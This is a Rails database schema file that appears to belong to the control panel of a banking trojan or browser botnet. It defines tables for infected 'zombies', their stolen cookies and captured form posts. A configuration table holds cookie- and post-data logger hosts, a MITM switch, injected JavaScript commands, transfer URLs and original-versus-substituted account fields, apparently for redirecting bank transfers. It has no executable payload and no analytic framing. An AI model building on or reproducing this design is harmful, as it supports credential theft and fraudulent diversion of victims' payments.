# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended to check this file into your version control system.

ActiveRecord::Schema.define(:version => 20120531120650) do

  create_table "ccconfigs", :force => true do |t|
    t.string   "balancepage"
	t.string	"loginhost"
    t.boolean  "checksslvar"
    t.string   "cookieloggerhost"
    t.boolean  "cookieloggingenabled"
    t.boolean  "enablemitm"
    t.integer  "jscommandid"
    t.string   "jscommand"
    t.string   "logoutpostdata"
    t.string   "modifyurl"
    t.string   "myaccount"
    t.string   "newaccount"
    t.string   "origaccount"
    t.string   "origmsg"
    t.string   "postdataloggerhost"
    t.boolean  "postenabled"
    t.string   "cookielist"
    t.string   "transferurl"
    t.string   "uploadpath"
    t.integer  "zombie_id"
    t.datetime "created_at",           :null => false
    t.datetime "updated_at",           :null => false
  end

  add_index "ccconfigs", ["zombie_id"], :name => "index_ccconfigs_on_zombie_id"

  create_table "cookies", :force => true do |t|
    t.string   "data"
    t.integer  "zombie_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end

  add_index "cookies", ["zombie_id"], :name => "index_cookies_on_zombie_id"

  create_table "postinfos", :force => true do |t|
    t.string   "data"
    t.integer  "zombie_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end

  add_index "postinfos", ["zombie_id"], :name => "index_postinfos_on_zombie_id"

  create_table "zombies", :force => true do |t|
    t.string   "username"
    t.string   "os"
    t.string   "browsername"
    t.string   "browserversion"
    t.datetime "lastseen"
    t.string   "hashid"
    t.datetime "created_at",     :null => false
    t.datetime "updated_at",     :null => false
  end

end
